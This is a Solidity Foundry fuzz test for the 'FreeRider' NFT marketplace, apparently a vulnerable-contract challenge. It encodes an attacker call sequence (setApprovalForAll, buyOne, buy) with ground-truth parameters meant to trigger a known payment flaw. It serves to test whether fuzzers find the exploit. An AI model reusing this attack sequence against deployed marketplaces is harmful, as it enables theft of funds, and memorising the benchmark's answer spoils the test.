// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import {ERC721Basic} from "@utils/ERC721Basic.sol";

import {FreeRiderNFTMarketplace} from "examples/FreeRider/FreeRiderNFTMarketplace.sol";
import {FreeRiderBuyer} from "examples/FreeRider/FreeRiderBuyer.sol";
import {FreeRiderSeller} from "examples/FreeRider/FreeRiderSeller.sol";

contract FreeRiderFuzzing is Test {
    address owner;
    address attacker;

    FreeRiderNFTMarketplace public marketPlace;
    FreeRiderBuyer public buyer;
    FreeRiderSeller public seller;
    ERC721Basic public nft;

    uint256 public PRICE_FOR_ONE = 15 ether;
    uint256 public PAYOUT = 20 ether;
    uint256 tokenId;

    uint256 public requiredToken = PRICE_FOR_ONE + PAYOUT;

    function setUp() public {
        owner = address(this);
        attacker = address(0xdeadbeef);
        vm.deal(attacker, PRICE_FOR_ONE);

        nft = new ERC721Basic();
        marketPlace = new FreeRiderNFTMarketplace(address(nft));
        buyer = new FreeRiderBuyer{value: PAYOUT}(address(nft), PAYOUT);
        seller = new FreeRiderSeller(
            address(nft),
            address(marketPlace),
            PRICE_FOR_ONE
        );

        tokenId = seller.tokenWTS();
        nft.mint(address(seller), tokenId);
        vm.prank(address(seller));
        nft.setApprovalForAll(address(marketPlace), true);
        vm.prank(address(seller));
        marketPlace.offerOne(tokenId, PRICE_FOR_ONE);
    }

    function addressSelector(uint256 e) public returns (address) {
        address[6] memory addresses = [
            address(0),
            attacker,
            address(nft),
            address(marketPlace),
            address(buyer),
            address(seller)
        ];
        e = bound(e, 0, addresses.length - 1);
        return addresses[e];
    }

    function testAttackGT() public {
        testAttack(4, true, tokenId, PRICE_FOR_ONE);
    }

    function testAttack(
        uint256 e0,
        bool b0,
        uint256 v0,
        uint256 v1
    ) public {
        address a0 = addressSelector(e0);
        bool succeed;
        bytes memory call_data;
        vm.startPrank(attacker);

        call_data = abi.encodeWithSignature(
            "setApprovalForAll(address,bool)",
            a0,
            b0
        );
        (succeed, ) = address(nft).call(call_data);
        if (succeed) {
            seller.removeReceiver();
            call_data = abi.encodeWithSignature("buyOne(uint256)", v0);
            (succeed, ) = address(marketPlace).call{value: v1}(call_data);
            if (succeed) {
                call_data = abi.encodeWithSignature("buy()");
                (succeed, ) = address(buyer).call(call_data);
                if (succeed) {
                    emit log_named_uint("Attacker.balance: ", attacker.balance);
                    assert(attacker.balance < requiredToken);
                }
            }
        }
        vm.stopPrank();
    }
}
